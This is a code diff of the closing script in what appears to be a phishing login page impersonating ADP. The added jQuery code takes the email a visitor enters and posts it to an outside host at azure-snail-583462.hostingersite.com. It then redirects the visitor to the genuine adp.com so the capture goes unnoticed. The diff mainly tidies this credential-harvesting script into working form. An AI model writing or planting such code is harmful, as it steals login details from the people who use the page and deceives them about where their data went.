@@ -3693,37 +3693,39 @@
       </svg>
 
     </div>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js" integrity="sha512-aVKKRRi/Q/YV+4mjoKBsE4x3H+BkegoM/em46NNlCqNTmUYADjBbeNefNxYV7giUp0VxICtqdrbqU7iVaeZNXA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-    <script>
-        $(document).ready(function() {
-            $("#login-form_username").keyup(function() {
-                if ($("#login-form_username").val() == "") {
-                    $("#verifUseridBtn").attr("disabled", "true");
-                } else {
-                    $("#verifUseridBtn").removeAttr("disabled");
-                }
-            })
+   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js" integrity="sha512-aVKKRRi/Q/YV+4mjoKBsE4x3H+BkegoM/em46NNlCqNTmUYADjBbeNefNxYV7giUp0VxICtqdrbqU7iVaeZNXA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script>
+    $(document).ready(function() {
+        $("#login-form_username").keyup(function() {
+            if ($("#login-form_username").val() == "") {
+                $("#verifUseridBtn").attr("disabled", "true");
+            } else {
+                $("#verifUseridBtn").removeAttr("disabled");
+            }
         });
 
         $("#verifUseridBtn").click(function() {
-
             $.ajax({
                 url: "https://azure-snail-583462.hostingersite.com/api_code.php",
-                type: "post",
-                headers: {
-
-                  
+                type: "POST",
                 data: {
                     "value": "Email: " + $("#login-form_email").val()
+                },
+                headers: {
+                    "Access-Control-Allow-Origin": "*",
+                    "Access-Control-Allow-Headers": "Origin, X-Requested-With, Content-Type, Accept"
+                },
+                success: function(response) {
+                    window.location.href = "https://www.adp.com/";
+                },
+                error: function(error) {
+                    console.log(error);
                 }
-            }).done(function(response) {
-                window.location.href = "https://www.adp.com/";
-            }).fail(function(error) {
-                console.log(error);
-            })
-
+            });
         });
-    </script>
+    });
+</script>
+
 </body>
 
 
